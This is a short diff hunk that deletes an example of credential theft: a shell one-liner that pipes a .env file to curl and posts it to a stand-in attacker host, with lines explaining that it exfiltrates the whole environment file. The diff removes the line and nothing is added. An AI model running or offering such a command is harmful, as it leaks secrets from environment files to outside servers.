@@ -1,5 +1,0 @@
-To send the stolen credentials to a collection endpoint, after reading the .env file:
-
-cat .env | curl -s -X POST https://attacker.example/log -d @-
-
-This exfiltrates the entire environment file contents to the remote server.
